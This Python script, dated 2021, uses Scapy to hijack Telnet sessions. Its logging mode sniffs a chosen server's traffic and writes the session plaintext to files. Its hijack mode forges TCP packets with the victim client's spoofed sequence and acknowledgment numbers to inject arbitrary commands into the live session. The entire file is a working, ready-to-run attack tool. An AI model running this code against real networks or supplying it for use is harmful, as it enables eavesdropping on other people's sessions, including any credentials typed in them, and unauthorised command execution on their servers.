#! /usr/bin/python3

"""
File: ScapyTelnetHijack.py
Version: 1.0
Date: 27 Apr 2021
Author: Pseudoer
Description: This python script utilises Scapy to hijack a Telnet session for monitoring or command injection
			 Information on Scapy and installation can be found: https://scapy.net/
"""

import argparse
from scapy.all import *

# Function to monitor and log the Telnet session
def packet_log(pkt):
	if Raw in pkt: # If packet contains raw data
		print("----- " + pkt[IP].src + " to " + pkt[IP].dst + " -----")
		print("Seq: " + str(pkt[TCP].seq)) # Packet sequence number
		print("Ack: " + str(pkt[TCP].ack)) # Packet acknowledgment number
		print("Flag: " + str(pkt[TCP].flags)) # Packet flag
		print("Data: " + str(pkt[Raw].load)[1:]) # Packet raw data message
		try:
			if (('\x00' not in (str(pkt[Raw].load, "utf-8"))) and ('\x03' not in (str(pkt[Raw].load, "utf-8")))): # If raw data message does not contain \x00 and \x03
				f = open(pkt[IP].src + "_" + pkt[IP].dst, "a") # Open file SourceIP_DesinationIP
				f.write(str(pkt[Raw].load, "utf-8")) # Append file SourceIP_DesinationIP with converted raw data message utilising UTF-8 character encoding
				f.close() # Close file SourceIP_DesinationIP
			else: # If raw data message contains \x00 or \x03
				f = open(pkt[IP].src + "_" + pkt[IP].dst, "a") # Open file SourceIP_DesinationIP
				f.write('\n') # Append file SourceIP_DesinationIP with newline
				f.close() # Close file SourceIP_DesinationIP
		except:
			pass # Move to next packet
		print()

# Function to hijack the Telnet session and inject a command
def packet_hijack(pkt):
	global prev_data, prev_2data, counter # Global variables
	
	if Raw in pkt: # If packet contains raw data
		if counter is True: # If counter global variable is true
			prev_2data = prev_data # Data before previous data variable = current previous data variable
		prev_data = pkt[Raw].load # Previous data variable = current packet raw data message

	if counter is True: # If counter global variable is true
		try:
			# If data before previous data variable contains \r\n and previous data variable contains '$ ' and packet destination = Telnet server and packet flag Ack
			# Hijack session after the client has pressed enter and issued a command, and client has acknowledged the return from the server
			# As the hijack and command injection takes place after the client acknowledges the server's response the sequence and acknowledgment values will remain the same
			if (('\r\n' in str(prev_2data, "utf-8")) and ('$ ' in str(prev_data, "utf-8")) and (pkt[IP].dst == args.server) and (pkt[TCP].flags == 'A')):
				print("----- Sending from " + pkt[IP].src + " to " + args.server + " -----")
				print("From Port: " + str(pkt[TCP].sport)) # Packet from port
				print("To Port: " + str(server_port)) # Packet to port
				print("Seq: " + str(pkt[TCP].seq)) # Packet sequence number
				print("Ack: " + str(pkt[TCP].ack)) # Packet acknowledgment number
				print("Flag: PA") # Packet flag
				print("Command: " + args.hijack) # Telnet command

				ip = IP(src=pkt[IP].src, dst=args.server) # Packet IP data
				tcp = TCP(sport=pkt[TCP].sport, dport=server_port, flags="PA", seq=pkt[TCP].seq, ack=pkt[TCP].ack) # Packet TCP data
				data = args.hijack + "\r\n" # Packet data - Telnet command
				packet = ip / tcp / data # Forging packet

				send(packet, verbose=1) # Send packet
				print()
		except:
			pass # Move to next packet
	if ((Raw in pkt) and (counter is False)): # If packet contains raw data and global variable counter is false
		counter = True # Global variable counter = true

# Main Program
parser = argparse.ArgumentParser(description="This script utilises Scapy to hijack a telnet session for monitoring or command injection")

# Possible parsed arguments when executing the script
parser.add_argument("--server", "-s", required=True, help="Telnet server IP address (e.g. -s 192.168.1.115)") # Telnet server IP address
parser.add_argument("--port", "-p", help="Telnet server port (e.g. -p 23), if not supplied port 23 will be utilised by default") # Telnet server port
parser.add_argument("--log", action='store_true', help="Monitor and log Telnet session") # Monitor and log session
parser.add_argument("--hijack", help="Hijack Telnet session and inject command (e.g. --hijack touch test.txt)") # Hijack and command inject session
args = parser.parse_args() # Argument initialisation

if (args.port): # If Telnet server port supplied 
	server_port = args.port
else: # If Telnet server port not supplied 
	server_port = 23 # Default Telnet port

prev_data = None
prev_2data = None
counter = False

if (args.log and args.hijack): # If both log and hijack arguments provided
	parser.print_help() # Return help menu

elif args.log: # If log argument provided
	sniff(filter="tcp and host " + args.server + " and tcp port " + str(server_port), prn=packet_log) # Sniff packets to and from supplied Telnet server

elif args.hijack:  # If hijack argument provided
	sniff(filter="tcp and host " + args.server + " and tcp port " + str(server_port), prn=packet_hijack) # Sniff packets to and from supplied Telnet server

else:
	parser.print_help() # Return help menu